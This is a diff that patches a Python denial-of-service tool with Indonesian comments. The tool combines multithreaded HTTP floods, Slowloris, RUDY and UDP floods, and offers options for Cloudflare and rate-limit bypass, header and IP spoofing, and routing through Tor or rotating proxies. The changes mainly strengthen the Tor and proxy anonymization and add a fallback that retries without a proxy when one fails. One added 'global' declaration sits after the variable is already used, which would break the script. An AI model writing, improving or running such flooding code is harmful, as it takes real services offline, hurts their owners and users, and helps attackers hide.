@@ -11,7 +11,6 @@ import threading
 import argparse
 import signal
 import urllib.parse
-from datetime import datetime
 from collections import defaultdict
 
 try:
@@ -22,12 +21,12 @@ except ImportError:
     print("Install requests: pip install requests")
     sys.exit(1)
 
+# Cek pysocks untuk Tor
 try:
     import socks
-    import socket
-    import sockshandler
+    SOCKS_AVAILABLE = True
 except ImportError:
-    socks = None
+    SOCKS_AVAILABLE = False
 
 # ================ KONFIGURASI ================
 VERSION = "1.0.0"
@@ -49,7 +48,6 @@ use_random_ip = False
 use_pipeline = False
 use_keep_alive = True
 verbose = False
-compact_mode = True   # selalu compact
 
 headers_referers = [
     "http://www.google.com/?q=",
@@ -80,7 +78,7 @@ headers_useragents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
 ]
 
-# Statistik global
+# Statistik
 stats = {
     'success': 0,
     'failed': 0,
@@ -135,7 +133,6 @@ def build_query_params():
     return "&".join(params)
 
 def build_gzip_bomb(size_mb):
-    # simulasi bomb (hanya string berulang)
     return "A" * (size_mb * 1024 * 1024 // 100)
 
 def load_proxies(filename):
@@ -193,7 +190,8 @@ def slowloris_attack(host):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-            s.connect((host.split(':')[0], int(host.split(':')[1])))
+            host_parts = host.split(':')
+            s.connect((host_parts[0], int(host_parts[1])))
             s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {get_random_user_agent()}\r\nAccept: */*\r\n".encode())
             while not stop_event.is_set():
                 s.send(f"X-Header-{random.randint(1,9999)}: {build_random_string(random.randint(10,30))}\r\n".encode())
@@ -209,21 +207,33 @@ def slowloris_attack(host):
 def worker(target_url, host, data, headers, payload_size):
     session = requests.Session()
     session.verify = False
-    session.timeout = 30
 
-    # Proxy
-    if use_proxy and proxy_list:
+    # Proxy setup
+    proxy_http = None
+    proxy_https = None
+
+    if use_tor:
+        if SOCKS_AVAILABLE:
+            proxy_http = 'socks5://127.0.0.1:9050'
+            proxy_https = 'socks5://127.0.0.1:9050'
+        else:
+            if verbose:
+                print(" [!] pysocks not installed. Tor disabled.")
+            global use_tor
+            use_tor = False
+    elif use_proxy and proxy_list:
         proxy_addr = get_proxy()
         if proxy_addr:
-            session.proxies = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
-    if use_tor:
-        if socks is not None:
-            session.proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
-        else:
-            # fallback ke HTTP proxy (tidak sempurna)
-            pass
+            proxy_http = f'http://{proxy_addr}'
+            proxy_https = f'http://{proxy_addr}'
 
-    # Keep-Alive
+    if proxy_http or proxy_https:
+        session.proxies = {}
+        if proxy_http:
+            session.proxies['http'] = proxy_http
+        if proxy_https:
+            session.proxies['https'] = proxy_https
+
     if not use_keep_alive:
         session.headers['Connection'] = 'close'
 
@@ -231,8 +241,8 @@ def worker(target_url, host, data, headers, payload_size):
 
     while not stop_event.is_set():
         try:
+            # Buat request
             if use_rudy and random.random() < 0.33:
-                # RUDY: POST dengan payload besar
                 payload = "A" * (payload_size * 1024 * 1024 // 2)
                 req = requests.Request('POST', target_url, data=payload)
                 req.headers['Content-Length'] = str(len(payload))
@@ -247,11 +257,10 @@ def worker(target_url, host, data, headers, payload_size):
                     req = requests.Request('POST', target_url, data=data)
                     req.headers['Content-Type'] = 'application/x-www-form-urlencoded'
             else:
-                # GET dengan query random
                 query = build_query_params()
                 req = requests.Request('GET', target_url + param_joiner + query)
 
-            # headers dasar
+            # Headers dasar
             req.headers['User-Agent'] = get_random_user_agent()
             req.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
             req.headers['Accept-Charset'] = ACCEPT_CHARSET
@@ -275,7 +284,6 @@ def worker(target_url, host, data, headers, payload_size):
             if use_cloudflare:
                 req.headers['Cookie'] = f"__cfduid={build_random_string(random.randint(10,30))}"
 
-            # Custom headers dari argumen
             for h in headers:
                 if ':' in h:
                     key, val = h.split(':', 1)
@@ -286,7 +294,19 @@ def worker(target_url, host, data, headers, payload_size):
 
             prep = session.prepare_request(req)
             start = time.time()
-            resp = session.send(prep, timeout=30)
+            try:
+                resp = session.send(prep, timeout=30)
+            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as e:
+                # Jika proxy error, coba tanpa proxy
+                if verbose:
+                    print(f"  ⚠️ Proxy error, retrying without proxy")
+                session.proxies = {}
+                resp = session.send(prep, timeout=30)
+            except requests.exceptions.Timeout:
+                with stats['lock']:
+                    stats['failed'] += 1
+                continue
+
             latency = int((time.time() - start)*1000)
 
             with stats['lock']:
@@ -360,20 +380,20 @@ def parse_args():
     parser.add_argument('--data', help='Data to POST')
     parser.add_argument('--header', action='append', help='Custom header (key:value)')
 
-    parser.add_argument('--http2', action='store_true', help='Enable HTTP/2 Rapid Reset')
+    parser.add_argument('--http2', action='store_true', help='Enable HTTP/2 Rapid Reset (not fully implemented in requests)')
     parser.add_argument('--udp', action='store_true', help='Enable UDP flood')
     parser.add_argument('--slowloris', action='store_true', help='Enable Slowloris')
     parser.add_argument('--rudy', action='store_true', help='Enable RUDY')
     parser.add_argument('--gzip-bomb', action='store_true', help='Enable Gzip Bomb')
     parser.add_argument('--proxy', action='store_true', help='Enable proxy rotation')
     parser.add_argument('--proxy-file', help='Proxy file (ip:port per line)')
-    parser.add_argument('--tor', action='store_true', help='Route through Tor')
+    parser.add_argument('--tor', action='store_true', help='Route through Tor (requires pysocks)')
     parser.add_argument('--cloudflare', action='store_true', help='Enable Cloudflare bypass')
     parser.add_argument('--fingerprint', action='store_true', help='Enable fingerprint spoofing')
     parser.add_argument('--referer', action='store_true', help='Enable referer spoofing')
     parser.add_argument('--ratelimit', action='store_true', help='Enable rate limit bypass')
     parser.add_argument('--random-ip', action='store_true', help='Use random X-Forwarded-For IPs')
-    parser.add_argument('--pipeline', action='store_true', help='Enable HTTP pipelining (not fully implemented)')
+    parser.add_argument('--pipeline', action='store_true', help='Enable HTTP pipelining (not implemented)')
     parser.add_argument('--keep-alive', action='store_true', default=True, help='Keep-alive connections')
     parser.add_argument('--all', action='store_true', help='Enable ALL features')
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
@@ -390,7 +410,6 @@ def parse_args():
         args.proxy = args.tor = args.cloudflare = args.fingerprint = True
         args.referer = args.ratelimit = args.random_ip = args.pipeline = True
 
-    # set global
     use_http2 = args.http2
     use_udp = args.udp
     use_slowloris = args.slowloris
@@ -422,7 +441,6 @@ def parse_args():
         load_proxies(args.proxy_file)
 
     if use_referer:
-        # generate lebih banyak referer
         domains = ["google.com", "facebook.com", "youtube.com", "twitter.com", "instagram.com",
                    "linkedin.com", "reddit.com", "wikipedia.org", "amazon.com", "netflix.com",
                    "github.com", "stackoverflow.com", "quora.com", "medium.com", "blogger.com",
@@ -431,6 +449,10 @@ def parse_args():
             for protocol in ["http", "https"]:
                 headers_referers.append(f"{protocol}://{domain}/search?q=")
                 headers_referers.append(f"{protocol}://{domain}/?q=")
+
+    if use_tor and not SOCKS_AVAILABLE:
+        print(" ⚠️ pysocks not installed. Tor will be disabled.")
+        use_tor = False
 
     return args
 
@@ -463,22 +485,28 @@ def main():
 
     print("\n 🔥 SENDING THREAD 🚀🚀🚀......\n")
 
-    # Start attack threads
+    # Start worker threads
     threads = []
     for _ in range(args.threads):
-        t = threading.Thread(target=worker, args=(args.target, urllib.parse.urlparse(args.target).netloc, args.data or '', args.header or [], args.payload_size))
+        t = threading.Thread(target=worker, args=(
+            args.target,
+            urllib.parse.urlparse(args.target).netloc,
+            args.data or '',
+            args.header or [],
+            args.payload_size
+        ))
         t.daemon = True
         t.start()
         threads.append(t)
 
-    # Start UDP flood jika diaktifkan
+    # Start UDP flood
     if use_udp:
         host = urllib.parse.urlparse(args.target).netloc
         t_udp = threading.Thread(target=udp_flood, args=(host,))
         t_udp.daemon = True
         t_udp.start()
 
-    # Start Slowloris jika diaktifkan
+    # Start Slowloris
     if use_slowloris:
         host = urllib.parse.urlparse(args.target).netloc
         t_slow = threading.Thread(target=slowloris_attack, args=(host,))
@@ -491,11 +519,9 @@ def main():
     t_stats.daemon = True
     t_stats.start()
 
-    # Signal handler
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
-    # Tunggu durasi atau sinyal
     try:
         time.sleep(args.duration)
         print("\n  ⏰ Duration completed")
@@ -503,9 +529,7 @@ def main():
         pass
 
     stop_event.set()
-
-    # Tunggu semua thread selesai (tapi karena daemon, kita tunggu sebentar)
-    time.sleep(1)
+    time.sleep(1)  # beri waktu thread berhenti
 
     # Final stats
     elapsed = time.time() - stats['start_time']
